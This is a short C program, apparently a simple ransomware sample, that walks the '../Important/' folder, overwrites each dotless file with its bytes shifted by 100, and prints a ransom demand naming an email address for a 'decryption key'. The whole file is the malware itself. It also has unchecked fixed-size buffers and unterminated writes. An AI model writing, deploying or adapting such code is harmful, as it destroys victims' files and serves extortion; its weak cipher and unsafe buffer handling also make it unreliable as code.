#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>


int main() {
    DIR* dir = opendir("../Important/");
    struct dirent* en;

    if (dir != NULL) {
        while ((en = readdir(dir)) != NULL) {
            if (!(strstr(en -> d_name, "."))) {
                char nameBuf[256] = "../Important/";
                strncat(nameBuf, en -> d_name, 30);

                printf("Encrypting: %s\n", en -> d_name);

                char fcBuffer[5000];

                FILE* fp = fopen(nameBuf, "r");

                fseek(fp, 0, SEEK_END);
                size_t size = ftell(fp);
                fseek(fp, 0, SEEK_SET);

                fread(fcBuffer, 1, size, fp);

                char writeBuffer[5000];

                for (int i = 0; i < size; ++i) {
                    writeBuffer[i] = fcBuffer[i] + 100;
                }

                FILE* fp1 = fopen(nameBuf, "w");

                fputs(writeBuffer, fp1);

                fclose(fp1);
                fclose(fp);
            }
        }

        printf("\nYour files have been encrypted, please email teaqllabs@gmail.com for the decryption key.");
        closedir(dir);
    }
}
